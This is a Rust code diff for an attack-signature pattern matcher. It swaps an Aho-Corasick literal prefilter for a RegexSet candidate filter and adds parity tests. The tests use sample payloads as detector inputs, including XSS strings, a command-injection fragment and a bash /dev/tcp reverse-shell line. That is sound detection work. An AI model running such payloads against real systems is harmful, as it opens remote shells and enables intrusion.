@@ -1,16 +1,12 @@
-//! High-performance pattern matcher using Aho-Corasick pre-filtering + Rust regex.
+//! Pattern matcher using a complete RegexSet candidate filter + Rust regex.
 //!
 //! The matching pipeline:
-//! 1. Aho-Corasick scans the input for any literal substring from any pattern
-//! 2. Only patterns whose literals matched get their full regex tested
-//! 3. This gives us near-zero cost for inputs that don't contain any attack signatures
-//!
-//! For patterns without literals (e.g., base64 exfil detection), the regex is always tested.
+//! Candidate selection uses the same regex language as the detailed matchers.
+//! Handwritten literal hints must not suppress valid regex alternatives.
 
 use crate::events::{MatchResult, PatternMatch, Severity};
 use crate::patterns::PatternDef;
-use aho_corasick::AhoCorasick;
-use regex::Regex;
+use regex::{Regex, RegexSet};
 use std::time::Instant;
 
 /// A compiled pattern ready for matching.
@@ -19,20 +15,13 @@ struct CompiledPattern {
     category: String,
     severity: Severity,
     regex: Regex,
-    /// Indices into the Aho-Corasick automaton's pattern list.
-    /// Empty means this pattern has no pre-filter and is always tested.
-    ac_indices: Vec<usize>,
 }
 
 /// The main pattern matching engine.
 pub struct PatternMatcher {
     patterns: Vec<CompiledPattern>,
-    /// Aho-Corasick automaton built from all literal pre-filter strings.
-    ac: AhoCorasick,
-    /// Maps an AC pattern index back to which CompiledPattern(s) it belongs to.
-    ac_to_pattern: Vec<Vec<usize>>,
-    /// Patterns that have no AC literals and must always be tested.
-    always_test: Vec<usize>,
+    /// Complete-language filter; None falls back to evaluating every regex.
+    candidates: Option<RegexSet>,
     /// Minimum aggregate score threshold — results below this are discarded.
     min_score: f64,
 }
@@ -41,11 +30,7 @@ impl PatternMatcher {
     /// Compile all pattern definitions into the matching engine.
     pub fn new(defs: &[PatternDef], min_score: f64, use_ac_prefilter: bool) -> Self {
         let mut patterns = Vec::with_capacity(defs.len());
-        let mut ac_literals: Vec<String> = Vec::new();
-        let mut ac_to_pattern: Vec<Vec<usize>> = Vec::new();
-        let mut always_test: Vec<usize> = Vec::new();
-
-        for (pat_idx, def) in defs.iter().enumerate() {
+        for def in defs {
             let regex = match Regex::new(def.regex) {
                 Ok(r) => r,
                 Err(e) => {
@@ -58,55 +43,39 @@ impl PatternMatcher {
                 }
             };
 
-            let mut ac_indices = Vec::new();
-
-            if !use_ac_prefilter || def.literals.is_empty() {
-                always_test.push(pat_idx);
-            } else {
-                for &lit in def.literals {
-                    let ac_idx = ac_literals.len();
-                    ac_literals.push(lit.to_lowercase());
-                    ac_indices.push(ac_idx);
-
-                    // Grow the reverse map
-                    while ac_to_pattern.len() <= ac_idx {
-                        ac_to_pattern.push(Vec::new());
-                    }
-                    ac_to_pattern[ac_idx].push(pat_idx);
-                }
-            }
-
             patterns.push(CompiledPattern {
                 name: def.name.to_string(),
                 category: def.category.to_string(),
                 severity: def.severity,
                 regex,
-                ac_indices,
             });
         }
 
-        let ac = AhoCorasick::builder()
-            .ascii_case_insensitive(true)
-            .build(&ac_literals)
-            .expect("failed to build Aho-Corasick automaton from pattern literals — this is a bug in patterns.rs");
-
-        // Log pattern compilation diagnostics using ac_indices
-        let ac_backed: usize = patterns.iter().filter(|p| !p.ac_indices.is_empty()).count();
-        let regex_only: usize = patterns.iter().filter(|p| p.ac_indices.is_empty()).count();
+        // Keep the existing configuration switch, but use sound candidate selection.
+        // A set can exceed its combined size limit even when each regex compiles;
+        // failure must preserve detection by evaluating the individual regexes.
+        let candidates = if use_ac_prefilter {
+            match RegexSet::new(patterns.iter().map(|p| p.regex.as_str())) {
+                Ok(set) => Some(set),
+                Err(error) => {
+                    tracing::warn!(%error, "candidate filter unavailable; using direct regex scan");
+                    None
+                }
+            }
+        } else {
+            None
+        };
         tracing::info!(
             total = patterns.len(),
-            ac_prefiltered = ac_backed,
-            regex_only = regex_only,
-            ac_literals = ac_literals.len(),
+            regex_set = candidates.is_some(),
+            legacy_literal_hints = defs.iter().map(|d| d.literals.len()).sum::<usize>(),
             min_score = min_score,
             "pattern matcher compiled"
         );
 
         Self {
             patterns,
-            ac,
-            ac_to_pattern,
-            always_test,
+            candidates,
             min_score,
         }
     }
@@ -116,12 +85,9 @@ impl PatternMatcher {
         self.patterns.len()
     }
 
-    /// Returns the number of patterns backed by Aho-Corasick pre-filtering.
-    pub fn ac_prefiltered_count(&self) -> usize {
-        self.patterns
-            .iter()
-            .filter(|p| !p.ac_indices.is_empty())
-            .count()
+    /// Returns the number of patterns covered by complete candidate selection.
+    pub fn prefiltered_count(&self) -> usize {
+        self.candidates.as_ref().map_or(0, RegexSet::len)
     }
 
     /// Match all patterns against the given input fields.
@@ -136,30 +102,11 @@ impl PatternMatcher {
                 continue;
             }
 
-            // Phase 1: Aho-Corasick pre-filter — find which patterns might match
-            let mut candidate_patterns = std::collections::HashSet::new();
-
-            // Always-test patterns are always candidates
-            for &idx in &self.always_test {
-                candidate_patterns.insert(idx);
-            }
-
-            // Find AC matches and map back to pattern indices
-            let lower = field_value.to_lowercase();
-            for mat in self.ac.find_iter(&lower) {
-                let ac_idx = mat.pattern().as_usize();
-                if ac_idx < self.ac_to_pattern.len() {
-                    for &pat_idx in &self.ac_to_pattern[ac_idx] {
-                        candidate_patterns.insert(pat_idx);
-                    }
-                }
-            }
-
-            // Phase 2: Full regex test only on candidates
-            for &pat_idx in &candidate_patterns {
-                if pat_idx >= self.patterns.len() {
-                    continue;
-                }
+            let candidate_patterns: Vec<usize> = match &self.candidates {
+                Some(set) => set.matches(field_value).into_iter().collect(),
+                None => (0..self.patterns.len()).collect(),
+            };
+            for pat_idx in candidate_patterns {
                 let pattern = &self.patterns[pat_idx];
 
                 if let Some(m) = pattern.regex.find(field_value) {
@@ -233,6 +180,71 @@ mod tests {
 
     fn matcher() -> PatternMatcher {
         PatternMatcher::new(&all_patterns(), 0.0, true)
+    }
+
+    #[test]
+    fn accelerated_scan_preserves_regex_matches() {
+        let defs = all_patterns();
+        let accelerated = PatternMatcher::new(&defs, 0.0, true);
+        let direct = PatternMatcher::new(&defs, 0.0, false);
+        for input in [
+            "<input oninput=alert(1)>",
+            "| id",
+            "javascript :alert(1)",
+            "char (65,66)",
+            "<\t script>alert(1)</script>",
+            "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
+            "ordinary benign text",
+        ] {
+            let names = |m: &PatternMatcher| {
+                let mut names: Vec<_> = m
+                    .scan("parity", &[("body", input)])
+                    .matches
+                    .into_iter()
+                    .map(|p| (p.pattern_name, p.matched_text, p.offset))
+                    .collect();
+                names.sort();
+                names
+            };
+            assert_eq!(names(&accelerated), names(&direct), "input: {input}");
+        }
+    }
+
+    #[test]
+    fn candidate_indices_follow_compiled_patterns() {
+        let defs = [
+            PatternDef {
+                name: "invalid",
+                category: "test",
+                severity: Severity::High,
+                regex: "[",
+                literals: &["invalid"],
+            },
+            PatternDef {
+                name: "short",
+                category: "test",
+                severity: Severity::High,
+                regex: "foo",
+                literals: &["foo"],
+            },
+            PatternDef {
+                name: "long",
+                category: "test",
+                severity: Severity::High,
+                regex: "foobar",
+                literals: &["foobar"],
+            },
+            PatternDef {
+                name: "duplicate",
+                category: "test",
+                severity: Severity::High,
+                regex: "foo",
+                literals: &["foo"],
+            },
+        ];
+        let m = PatternMatcher::new(&defs, 0.0, true);
+        let result = m.scan("indices", &[("body", "foobar")]);
+        assert_eq!(result.matches.len(), 3);
     }
 
     #[test]
